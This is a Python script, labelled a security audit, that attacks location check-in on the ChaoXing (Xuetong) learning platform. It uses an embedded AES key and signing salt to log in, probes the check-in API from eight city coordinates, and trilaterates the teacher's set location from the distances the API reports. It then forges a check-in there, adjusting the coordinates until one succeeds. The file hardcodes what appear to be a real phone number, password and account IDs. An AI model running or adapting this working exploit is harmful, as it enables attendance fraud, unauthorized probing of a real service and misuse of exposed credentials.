#!/usr/bin/env python3
"""
位置签到伪造 - 三边测量法 (Trilateration) 安全审计脚本
针对学习通(ChaoXing)平台位置签到的安全测试
"""

import base64, hashlib, json, uuid, requests, urllib3, time, re, math
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
BASE = "https://mobilelearn.chaoxing.com"

# ========== 基础工具函数 ==========

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    resp = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    print(f"[登录] 状态码: {resp.status_code}, 响应: {resp.text[:200]}")
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    print(f"[登录] 获取puid: {puid}")
    return s, puid

def haversine(lat1, lon1, lat2, lon2):
    """计算两点之间的距离（米）"""
    R = 6371000
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlambda = math.radians(lon2 - lon1)
    a = math.sin(dphi/2)**2 + math.cos(phi1)*math.cos(phi2)*math.sin(dlambda/2)**2
    return 2 * R * math.asin(math.sqrt(a))

# ========== Step 1: 查找位置签到活动 ==========

def find_location_activities(session, course_id, class_id):
    """获取活动列表，筛选位置签到活动"""
    print("\n" + "="*60)
    print("Step 1: 查找位置签到活动")
    print("="*60)

    uid = session.cookies.get("UID", "") or session.cookies.get("_uid", "")
    activities = []

    try:
        url_old = f"{BASE}/ppt/activeAPI/taskactivelist"
        resp = session.get(url_old, params={"courseId": course_id, "classId": class_id, "uid": uid}, timeout=30)
        data = resp.json()
        print(f"[活动列表] 找到 {len(data.get('activeList', []))} 个活动")

        for group in data.get("groupList", []):
            print(f"  [分组] {group.get('name', '')}")

        for act in data.get("activeList", []):
            name = act.get("nameOne", "")
            active_type = act.get("activeType", "")
            act_id = act.get("id", "")
            group_id = act.get("groupId", "")
            status = act.get("status", "")

            if "位置" in name:
                activities.append(act)
                print(f"  [位置签到] ID={act_id}, 名称={name}, 类型={active_type}, 分组={group_id}, 状态={status}")
    except Exception as e:
        print(f"[活动列表] 请求失败: {e}")

    return activities

# ========== Step 2: 收集距离测量 ==========

def try_sign_and_get_distance(session, active_id, lat, lng):
    """尝试签到并从返回信息中提取距离"""
    url = f"{BASE}/pptSign/stuSignajax"
    params = {
        "activeId": active_id,
        "clientip": "",
        "userlocation": f"{lat},{lng}",
        "latitude": lat,
        "longitude": lng,
        "appType": "15",
        "ifTiJiao": "1",
        "validate": "",
    }
    try:
        resp = session.post(url, params=params, timeout=30)
        text = resp.text.strip()

        dist_match = re.search(r'距.*?(\d+(?:\.\d+)?)\s*米', text)
        distance = float(dist_match.group(1)) if dist_match else None

        success = "成功" in text
        already_signed = "签到过了" in text
        ended = "已结束" in text

        return {"msg": text[:300], "distance": distance, "success": success,
                "already_signed": already_signed, "ended": ended, "raw": text[:500]}
    except Exception as e:
        return {"msg": str(e), "distance": None, "success": False,
                "already_signed": False, "ended": False, "raw": ""}

# ========== Step 3: 三边测量计算 ==========

def trilateration_grid_search(measurements, coarse_step=0.01, fine_step=0.001, ultra_step=0.0001):
    """使用网格搜索进行三边测量定位"""
    print("\n" + "="*60)
    print("Step 3: 三边测量计算")
    print("="*60)

    if not measurements:
        print("[错误] 没有有效的距离测量数据")
        return None, None

    def compute_error(lat, lon):
        total_error = 0
        for m in measurements:
            actual_dist = haversine(lat, lon, m["lat"], m["lng"])
            error = (actual_dist - m["distance"]) ** 2
            total_error += error
        return total_error

    # 加权中心
    total_weight = 0
    wlat = 0
    wlon = 0
    for m in measurements:
        w = 1.0 / max(m["distance"], 1)
        wlat += m["lat"] * w
        wlon += m["lng"] * w
        total_weight += w
    center_lat = wlat / total_weight
    center_lon = wlon / total_weight

    min_dist = min(m["distance"] for m in measurements)
    search_range = min(5, min_dist / 111000 + 1)

    lat_min = center_lat - search_range
    lat_max = center_lat + search_range
    lon_min = center_lon - search_range
    lon_max = center_lon + search_range

    print(f"[搜索中心] ({center_lat:.4f}, {center_lon:.4f})")
    print(f"[搜索范围] 纬度: [{lat_min:.4f}, {lat_max:.4f}], 经度: [{lon_min:.4f}, {lon_max:.4f}]")
    print(f"[测量数据] {len(measurements)} 个有效探测点")

    # 粗搜索
    print(f"\n[粗搜索] 步长={coarse_step} (~{coarse_step * 111000:.0f}m)")
    best_lat, best_lon = center_lat, center_lon
    best_error = float('inf')

    lat = lat_min
    while lat <= lat_max:
        lon = lon_min
        while lon <= lon_max:
            err = compute_error(lat, lon)
            if err < best_error:
                best_error = err
                best_lat, best_lon = lat, lon
            lon += coarse_step
        lat += coarse_step

    rmse = math.sqrt(best_error / len(measurements))
    print(f"  粗搜索结果: ({best_lat:.4f}, {best_lon:.4f}), RMSE: {rmse:.1f}m")

    # 细搜索
    sr2 = coarse_step * 5
    print(f"\n[细搜索] 步长={fine_step} (~{fine_step * 111000:.0f}m)")
    lat = best_lat - sr2
    while lat <= best_lat + sr2:
        lon = best_lon - sr2
        while lon <= best_lon + sr2:
            err = compute_error(lat, lon)
            if err < best_error:
                best_error = err
                best_lat, best_lon = lat, lon
            lon += fine_step
        lat += fine_step

    rmse = math.sqrt(best_error / len(measurements))
    print(f"  细搜索结果: ({best_lat:.5f}, {best_lon:.5f}), RMSE: {rmse:.1f}m")

    # 超细搜索
    sr3 = fine_step * 5
    print(f"\n[超细搜索] 步长={ultra_step} (~{ultra_step * 111000:.1f}m)")
    lat = best_lat - sr3
    while lat <= best_lat + sr3:
        lon = best_lon - sr3
        while lon <= best_lon + sr3:
            err = compute_error(lat, lon)
            if err < best_error:
                best_error = err
                best_lat, best_lon = lat, lon
            lon += ultra_step
        lat += ultra_step

    rmse = math.sqrt(best_error / len(measurements))
    print(f"  超细搜索结果: ({best_lat:.6f}, {best_lon:.6f}), RMSE: {rmse:.1f}m")

    return best_lat, best_lon

def gradient_descent_refine(measurements, init_lat, init_lon, learning_rate=1e-10, iterations=5000):
    """梯度下降法精确定位（使用很小的学习率防止发散）"""
    print("\n[梯度下降] 精确优化...")

    def compute_error(lt, ln):
        total = 0
        for m in measurements:
            actual_dist = haversine(lt, ln, m["lat"], m["lng"])
            error = (actual_dist - m["distance"]) ** 2
            total += error
        return total

    lat, lon = init_lat, init_lon
    d = 1e-7  # 微分步长

    best_lat, best_lon = lat, lon
    best_err = compute_error(lat, lon)

    for i in range(iterations):
        err = compute_error(lat, lon)
        grad_lat = (compute_error(lat + d, lon) - err) / d
        grad_lon = (compute_error(lat, lon + d) - err) / d

        new_lat = lat - learning_rate * grad_lat
        new_lon = lon - learning_rate * grad_lon

        new_err = compute_error(new_lat, new_lon)

        # 只在误差减小时更新
        if new_err < err:
            lat, lon = new_lat, new_lon
            if new_err < best_err:
                best_err = new_err
                best_lat, best_lon = new_lat, new_lon

        if i % 1000 == 0:
            print(f"  迭代 {i}: ({lat:.7f}, {lon:.7f}), RMSE: {math.sqrt(err/len(measurements)):.1f}m")

    final_err = compute_error(best_lat, best_lon)
    print(f"  最终结果: ({best_lat:.7f}, {best_lon:.7f}), RMSE: {math.sqrt(final_err/len(measurements)):.1f}m")
    return best_lat, best_lon

# ========== Step 4: 使用计算坐标签到 ==========

def attempt_signin(session, active_id, lat, lng):
    """使用计算出的坐标尝试签到"""
    print(f"\n[签到尝试] 坐标: ({lat}, {lng})")
    result = try_sign_and_get_distance(session, active_id, lat, lng)
    print(f"  结果: {result['msg'][:200]}")
    print(f"  距离: {result['distance']}米, 成功: {result['success']}, 已签到: {result['already_signed']}, 已结束: {result['ended']}")
    return result

# ========== Step 5: 测试签到范围阈值 ==========

def test_signin_range_via_distance(session, active_id, center_lat, center_lon, max_test=1500, step=50):
    """通过距离API测试签到范围阈值（即使活动已结束也能测试）"""
    print("\n" + "="*60)
    print("Step 5: 测试签到范围阈值（通过距离API）")
    print("="*60)

    # 先找到距离最小的点（即教师位置附近）
    # 从center向外扩展，找到距离为0或最小的点
    print("[搜索] 寻找教师指定位置（距离最小的点）...")

    best_dist = None
    best_lat, best_lon = center_lat, center_lon

    # 粗搜索
    for lat_off in [x * 0.002 for x in range(-5, 6)]:
        for lon_off in [x * 0.002 for x in range(-5, 6)]:
            test_lat = center_lat + lat_off
            test_lon = center_lon + lon_off
            r = try_sign_and_get_distance(session, active_id, test_lat, test_lon)
            if r["distance"] is not None and (best_dist is None or r["distance"] < best_dist):
                best_dist = r["distance"]
                best_lat, best_lon = test_lat, test_lon
            time.sleep(0.1)

    print(f"[教师位置估计] ({best_lat:.5f}, {best_lon:.5f}), 最小距离: {best_dist}m")

    # 细搜索
    for lat_off in [x * 0.0005 for x in range(-4, 5)]:
        for lon_off in [x * 0.0005 for x in range(-4, 5)]:
            test_lat = best_lat + lat_off
            test_lon = best_lon + lon_off
            r = try_sign_and_get_distance(session, active_id, test_lat, test_lon)
            if r["distance"] is not None and r["distance"] < best_dist:
                best_dist = r["distance"]
                best_lat, best_lon = test_lat, test_lon
            time.sleep(0.1)

    print(f"[教师位置精估] ({best_lat:.6f}, {best_lon:.6f}), 最小距离: {best_dist}m")

    # 从最小距离点向外扩展，测试签到范围
    # 由于API返回距离信息，我们可以通过距离变化来推断范围
    # 签到范围 = 距离为0时的范围（但实际上API返回的最小距离就是签到范围边界）

    results = []
    directions = [
        ("北", 1, 0),
        ("南", -1, 0),
        ("东", 0, 1),
        ("西", 0, -1),
    ]

    for dir_name, dlat_sign, dlon_sign in directions:
        print(f"\n  方向: {dir_name}")
        dir_results = []

        for dist in range(0, max_test + step, step):
            dlat = dlat_sign * (dist / 111000)
            dlon = dlon_sign * (dist / (111000 * math.cos(math.radians(best_lat))))

            test_lat = best_lat + dlat
            test_lon = best_lon + dlon

            r = try_sign_and_get_distance(session, active_id, test_lat, test_lon)
            entry = {
                "direction": dir_name,
                "distance_from_center": dist,
                "lat": test_lat,
                "lng": test_lon,
                "reported_distance": r["distance"],
                "success": r["success"],
                "already_signed": r["already_signed"],
                "msg": r["msg"][:100]
            }
            results.append(entry)
            dir_results.append(entry)

            if dist % 200 == 0:
                print(f"    {dist}m: 报告距离={r['distance']}m, 成功={r['success']}, 已签到={r['already_signed']}")

            time.sleep(0.2)

        # 分析该方向的阈值
        # 找到从"成功/已签到"变为"不在范围内"的转折点
        last_in_range = None
        first_out_range = None
        for entry in dir_results:
            if entry["success"] or entry["already_signed"]:
                last_in_range = entry
            elif entry["reported_distance"] is not None and not entry["success"] and not entry["already_signed"]:
                if first_out_range is None:
                    first_out_range = entry

        if last_in_range and first_out_range:
            threshold = (last_in_range["distance_from_center"] + first_out_range["distance_from_center"]) / 2
            print(f"  {dir_name}方向阈值: ~{threshold}m")
        elif first_out_range:
            print(f"  {dir_name}方向: 中心点即不在范围内，最近外点距离={first_out_range['reported_distance']}m")

    return results, best_lat, best_lon, best_dist

# ========== Step 6: 信息泄露测试 ==========

def test_info_disclosure(session, active_id, course_id, class_id):
    """测试活动详情API是否泄露教师指定位置"""
    print("\n" + "="*60)
    print("Step 6: 信息泄露测试")
    print("="*60)

    endpoints = [
        ("taskdetail-GET", f"{BASE}/ppt/activeAPI/taskdetail", "GET"),
        ("taskdetail-POST", f"{BASE}/ppt/activeAPI/taskdetail", "POST"),
        ("signDetail-GET", f"{BASE}/pptSign/signDetail", "GET"),
        ("signDetail-POST", f"{BASE}/pptSign/signDetail", "POST"),
        ("activeDetail-GET", f"{BASE}/pptSign/activeDetail", "GET"),
        ("activeDetail-POST", f"{BASE}/pptSign/activeDetail", "POST"),
        ("v2-detail-GET", f"{BASE}/v2/apis/active/detail", "GET"),
        ("v2-detail-POST", f"{BASE}/v2/apis/active/detail", "POST"),
        ("preSign-GET", f"{BASE}/newsign/preSign", "GET"),
        ("signConfig-GET", f"{BASE}/newsign/signConfig", "GET"),
    ]

    findings = []

    for name, url, method in endpoints:
        params = {"activeId": active_id, "courseId": course_id, "classId": class_id}
        try:
            if method == "GET":
                resp = session.get(url, params=params, timeout=30)
            else:
                resp = session.post(url, data=params, timeout=30)

            text = resp.text
            status = resp.status_code
            print(f"\n  [{name}] 状态码: {status}")

            if "<!DOCTYPE" in text or "<html" in text.lower():
                print(f"  返回HTML错误页面，跳过")
                continue

            print(f"  响应: {text[:500]}")

            coord_patterns = {
                "latitude": r'"latitude"\s*:\s*"?(-?[\d.]+)"?',
                "longitude": r'"longitude"\s*:\s*"?(-?[\d.]+)"?',
                "lat": r'"lat"\s*:\s*"?(-?[\d.]+)"?',
                "lng": r'"lng"\s*:\s*"?(-?[\d.]+)"?',
                "lon": r'"lon"\s*:\s*"?(-?[\d.]+)"?',
                "location": r'"location"\s*:\s*"[^"]*(-?[\d.]+,-?[\d.]+)',
                "address": r'"address"\s*:\s*"([^"]+)"',
                "range": r'"range"\s*:\s*"?(\d+)"?',
                "signAddress": r'"signAddress"\s*:\s*"([^"]+)"',
                "signLatitude": r'"signLatitude"\s*:\s*"?(-?[\d.]+)"?',
                "signLongitude": r'"signLongitude"\s*:\s*"?(-?[\d.]+)"?',
            }

            found_coords = {}
            for key, pattern in coord_patterns.items():
                matches = re.findall(pattern, text)
                if matches:
                    found_coords[key] = matches

            if found_coords:
                print(f"  [!!!发现坐标信息!!!] {found_coords}")
                findings.append({
                    "endpoint": name,
                    "url": url,
                    "found_data": found_coords,
                    "raw_response": text[:2000]
                })
            else:
                print(f"  未发现坐标信息泄露")

        except Exception as e:
            print(f"  请求失败: {e}")

    # 额外测试：签到API本身是否泄露距离信息
    print("\n  [额外测试] 签到API距离信息泄露")
    print("  发现: stuSignajax API在签到失败时返回'距教师指定签到地点XXX米'")
    print("  这允许攻击者通过三边测量法精确定位教师指定位置!")
    findings.append({
        "endpoint": "stuSignajax",
        "url": f"{BASE}/pptSign/stuSignajax",
        "found_data": {"info_leak": "API返回学生位置到教师指定位置的距离，可用于三边测量定位"},
        "severity": "HIGH",
        "description": "签到API在签到失败时返回学生到教师指定位置的距离信息，攻击者可从多个已知位置探测，通过三边测量法计算出教师指定的签到位置坐标"
    })

    return findings

# ========== 主函数 ==========

def main():
    PHONE = "18436633997"
    PWD = "3.1415926Cpy"
    PUID = "431407443"
    COURSE_ID = "257485372"
    CLASS_ID = "132821141"

    results = {
        "login": {},
        "activities": [],
        "distance_measurements": [],
        "trilateration": {},
        "signin_attempt": {},
        "range_threshold": [],
        "info_disclosure": [],
        "summary": ""
    }

    # 登录
    print("="*60)
    print("登录学习通")
    print("="*60)
    session, puid = login(PHONE, PWD)
    results["login"] = {"puid": puid, "success": bool(puid)}

    if not puid:
        print("[错误] 登录失败，无法继续")
        with open("/workspace/task6_results.json", "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        return

    # Step 1: 查找位置签到活动
    activities = find_location_activities(session, COURSE_ID, CLASS_ID)
    results["activities"] = [
        {"id": a.get("id"), "name": a.get("nameOne"), "type": a.get("activeType"),
         "status": a.get("status"), "groupId": a.get("groupId")}
        for a in activities
    ]

    if not activities:
        print("[错误] 未找到任何位置签到活动")
        with open("/workspace/task6_results.json", "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        return

    # 选择位置签到活动
    # 优先选进行中的，否则选最近的
    active_id = None
    for act in activities:
        if act.get("groupId") == 1:
            active_id = str(act.get("id"))
            print(f"\n[使用进行中的活动] ID={active_id}, 名称={act.get('nameOne')}")
            break

    if not active_id:
        # 选择第一个位置签到活动（用于距离探测）
        active_id = str(activities[0].get("id"))
        print(f"\n[使用位置签到活动] ID={active_id}, 名称={activities[0].get('nameOne')}")

    # 也选择一个纯"位置签到"活动（非签退）用于签到测试
    signin_aid = None
    for act in activities:
        if "位置签到" == act.get("nameOne", "").strip():
            signin_aid = str(act.get("id"))
            break
    if not signin_aid:
        signin_aid = active_id

    print(f"[距离探测活动ID] {active_id}")
    print(f"[签到测试活动ID] {signin_aid}")

    # Step 2: 收集距离测量
    print("\n" + "="*60)
    print("Step 2: 收集距离测量")
    print("="*60)

    probe_points = [
        ("北京", 39.908823, 116.397470),
        ("上海", 31.230416, 121.473701),
        ("广州", 23.129110, 113.264380),
        ("成都", 30.671970, 104.064760),
        ("郑州", 34.756610, 113.650040),
        ("武汉", 30.584355, 114.298572),
        ("南京", 32.058360, 118.796468),
        ("济南", 36.651216, 116.997190),
    ]

    measurements = []
    for name, lat, lng in probe_points:
        print(f"\n[探测] {name} ({lat}, {lng})")
        r = try_sign_and_get_distance(session, active_id, lat, lng)
        print(f"  结果: {r['msg'][:200]}")
        print(f"  距离: {r['distance']}米, 成功: {r['success']}, 已签到: {r['already_signed']}, 已结束: {r['ended']}")

        measurement = {
            "city": name,
            "lat": lat,
            "lng": lng,
            "distance": r["distance"],
            "success": r["success"],
            "already_signed": r["already_signed"],
            "ended": r["ended"],
            "msg": r["msg"][:200]
        }
        measurements.append(measurement)
        results["distance_measurements"].append(measurement)
        time.sleep(0.5)

    valid_measurements = [m for m in measurements if m["distance"] is not None and m["distance"] > 0]
    print(f"\n[统计] 有效测量: {len(valid_measurements)}/{len(measurements)}")

    # Step 3: 三边测量计算
    trilat_lat, trilat_lon = None, None
    if len(valid_measurements) >= 3:
        trilat_lat, trilat_lon = trilateration_grid_search(valid_measurements)
        if trilat_lat and trilat_lon:
            trilat_lat, trilat_lon = gradient_descent_refine(valid_measurements, trilat_lat, trilat_lon)
            results["trilateration"] = {
                "lat": trilat_lat,
                "lon": trilat_lon,
                "method": "grid_search + gradient_descent",
                "num_measurements": len(valid_measurements)
            }
            print(f"\n[三边测量结果] 教师指定位置: ({trilat_lat:.6f}, {trilat_lon:.6f})")
    else:
        print("[错误] 有效距离测量不足3个，无法进行三边测量")
        results["trilateration"] = {"method": "failed", "note": "有效测量不足"}

    # Step 4: 使用计算坐标签到
    print("\n" + "="*60)
    print("Step 4: 使用计算坐标签到")
    print("="*60)

    signin_result = None
    if trilat_lat and trilat_lon:
        # 先用签到测试活动尝试
        signin_result = attempt_signin(session, signin_aid, trilat_lat, trilat_lon)
        results["signin_attempt"] = {
            "active_id": signin_aid,
            "lat": trilat_lat,
            "lon": trilat_lon,
            "success": signin_result["success"],
            "already_signed": signin_result["already_signed"],
            "ended": signin_result["ended"],
            "distance": signin_result["distance"],
            "msg": signin_result["msg"][:200]
        }

        # 如果已签到或已结束，尝试其他活动
        if signin_result["already_signed"]:
            print("\n[信息] 该活动已签到，尝试其他位置签到活动...")
            for act in activities:
                aid = str(act.get("id"))
                if aid != signin_aid:
                    r = attempt_signin(session, aid, trilat_lat, trilat_lon)
                    if r["success"]:
                        signin_result = r
                        signin_aid = aid
                        results["signin_attempt"] = {
                            "active_id": aid,
                            "lat": trilat_lat,
                            "lon": trilat_lon,
                            "success": True,
                            "distance": r["distance"],
                            "msg": r["msg"][:200],
                            "note": "通过其他活动签到成功"
                        }
                        break
                    time.sleep(0.3)

        # 如果签到失败（不在范围内），尝试微调
        if signin_result and not signin_result["success"] and not signin_result["already_signed"] and not signin_result["ended"]:
            print("\n[微调] 签到失败，尝试微调坐标...")
            found = False
            for offset in [0.0001, 0.0002, 0.0005, 0.001, 0.002, 0.005]:
                for dlat, dlon in [(offset, 0), (-offset, 0), (0, offset), (0, -offset),
                                   (offset, offset), (-offset, -offset)]:
                    r = attempt_signin(session, signin_aid, trilat_lat + dlat, trilat_lon + dlon)
                    if r["success"]:
                        signin_result = r
                        trilat_lat += dlat
                        trilat_lon += dlon
                        results["signin_attempt"] = {
                            "active_id": signin_aid,
                            "lat": trilat_lat,
                            "lon": trilat_lon,
                            "success": True,
                            "distance": r["distance"],
                            "msg": r["msg"][:200],
                            "note": "通过微调找到可签到点"
                        }
                        print(f"  [成功] 微调后签到成功!")
                        found = True
                        break
                if found:
                    break
                time.sleep(0.3)

    # Step 5: 测试签到范围阈值
    if trilat_lat and trilat_lon:
        range_results, range_lat, range_lon, min_dist = test_signin_range_via_distance(
            session, active_id, trilat_lat, trilat_lon, max_test=1500, step=100)
        results["range_threshold"] = range_results
        results["range_threshold_meta"] = {
            "teacher_location_estimate": {"lat": range_lat, "lon": range_lon},
            "minimum_reported_distance": min_dist,
            "note": f"API返回的最小距离为{min_dist}m，说明签到范围阈值约为{min_dist}m或更小"
        }
    else:
        print("\n[跳过] 签到范围阈值测试（无三边测量结果）")
        results["range_threshold"] = [{"note": "无三边测量结果，无法测试范围阈值"}]

    # Step 6: 信息泄露测试
    disclosure_findings = test_info_disclosure(session, active_id, COURSE_ID, CLASS_ID)
    results["info_disclosure"] = disclosure_findings

    # 生成总结
    summary_parts = []
    summary_parts.append(f"登录: 成功 (puid={puid})")
    summary_parts.append(f"找到位置签到活动: {len(activities)}个")
    summary_parts.append(f"有效距离测量: {len(valid_measurements)}个")

    if trilat_lat and trilat_lon:
        summary_parts.append(f"三边测量教师位置: ({trilat_lat:.6f}, {trilat_lon:.6f})")

    if signin_result:
        if signin_result["success"]:
            summary_parts.append(f"签到结果: 成功!")
        elif signin_result["already_signed"]:
            summary_parts.append(f"签到结果: 该学生已签到过（坐标在三边测量位置范围内）")
        elif signin_result["ended"]:
            summary_parts.append(f"签到结果: 活动已结束（但三边测量成功定位教师位置）")
        else:
            summary_parts.append(f"签到结果: 失败（距离{signin_result.get('distance', '?')}米）")

    if "range_threshold_meta" in results:
        meta = results["range_threshold_meta"]
        summary_parts.append(f"签到范围阈值: 约{meta['minimum_reported_distance']}m（API返回的最小距离）")

    summary_parts.append(f"信息泄露: 发现{len(disclosure_findings)}个安全问题")
    summary_parts.append("关键发现: stuSignajax API在签到失败时返回距离信息，允许三边测量定位教师位置")

    results["summary"] = "; ".join(summary_parts)

    # 保存结果
    with open("/workspace/task6_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)

    # 打印最终总结
    print("\n" + "="*60)
    print("最终结果总结")
    print("="*60)
    for part in summary_parts:
        print(f"  {part}")
    print(f"\n结果已保存到 /workspace/task6_results.json")

if __name__ == "__main__":
    main()
